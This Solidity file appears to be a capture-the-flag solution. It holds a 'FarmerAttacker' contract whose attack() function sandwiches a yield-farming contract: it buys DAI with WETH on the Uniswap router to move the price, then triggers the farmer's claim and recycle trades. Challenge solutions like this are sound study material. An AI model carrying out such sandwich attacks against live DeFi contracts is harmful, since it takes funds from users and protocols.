pragma solidity 0.8.0;

import "./Setup.sol";
import "./Farmer.sol";
import "hardhat/console.sol";

contract FarmerAttacker {
    Setup public setup;
    CompDaiFarmer public farmer;
    CompFaucet public faucet;

    ERC20Like public constant COMP =
        ERC20Like(0xc00e94Cb662C3520282E6f5717214004A7f26888);
    ERC20Like public constant DAI =
        ERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    CERC20Like public constant CDAI =
        CERC20Like(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643);
    UniRouter public constant ROUTER =
        UniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    WETH9 public constant WETH =
        WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    constructor(Setup _setup) {
        setup = _setup;
        farmer = _setup.farmer();
        faucet = _setup.faucet();
    }

    function attack() external payable {
        // simple sandwich attack on farmer
        // farmer trades Comp -> WETH -> DAI
        // trading Comp -> WETH would be more profitable for us
        // but we don't have any Comp, so do the simpler WETH -> DAI trade

        WETH.deposit{value: msg.value}();
        WETH.approve(address(ROUTER), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(DAI);

        uint256 bal = WETH.balanceOf(address(this));

        ROUTER.swapExactTokensForTokens(
            bal,
            0,
            path,
            address(this),
            block.timestamp
        );

        console.log(
            "COMP.balanceOf(address(faucet)) = %s",
            COMP.balanceOf(address(faucet))
        );
        console.log(
            "COMP.balanceOf(address(farmer)) = %s",
            COMP.balanceOf(address(farmer))
        );
        console.log(
            "DAI.balanceOf(address(farmer)) = %s",
            DAI.balanceOf(address(farmer))
        );

        farmer.claim();
        farmer.recycle();

        require(setup.isSolved(), "!solved");
    }
}
